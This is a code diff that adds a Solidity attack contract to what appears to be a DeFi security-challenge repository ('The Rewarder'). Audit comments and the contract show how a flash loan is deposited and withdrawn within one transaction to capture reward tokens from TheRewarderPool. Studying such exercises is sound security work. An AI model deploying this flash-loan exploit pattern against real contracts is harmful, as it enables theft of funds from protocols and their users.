@@ -106,3 +106,44 @@ contract TheRewarderPool {
         return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
     }
 }
+
+import { FlashLoanerPool } from "./FlashLoanerPool.sol";
+
+// @audit attacker can call flashLoanPool.flashLoan(), then call rewarderPool.deposit().
+// rewarderPool.deposit() mints accountingTokens then calls rewarderPool.distributeRewards().
+//
+// after rewarderPool.deposit() finishes attacker can call rewarderPool.withdraw()
+// to return flash loan. This allows attacker to use flash loan to extract reward tokens
+// from rewarderPool
+contract TheRewarderPoolAttack {
+    TheRewarderPool rewarderPool;
+    FlashLoanerPool flashLoanPool;
+    uint256 amount;
+
+    function attack(address payable _flashLoanPool, address payable _rewarderPool, uint256 _amount) external {
+        flashLoanPool = FlashLoanerPool(_flashLoanPool);
+        rewarderPool  = TheRewarderPool(_rewarderPool);
+        amount        = _amount;
+
+        // approve RewardedPool to spender AttrackContract's liquidityTokens
+        // before getting flash loan
+        flashLoanPool.liquidityToken().approve(_rewarderPool, amount);
+
+        flashLoanPool.flashLoan(amount);
+
+        // transfer reward tokens to attacker
+        RewardToken rewardToken = RewardToken(rewarderPool.rewardToken()); 
+        SafeTransferLib.safeTransfer(address(rewarderPool.rewardToken()), msg.sender, rewardToken.balanceOf(address(this)));
+    }
+
+    function receiveFlashLoan(uint256) external payable {
+
+        rewarderPool.deposit(amount);
+        rewarderPool.withdraw(amount);
+
+        // return flashLoan funds
+        SafeTransferLib.safeTransfer(address(flashLoanPool.liquidityToken()), address(flashLoanPool), amount );
+    }
+
+    receive() external payable {}
+}
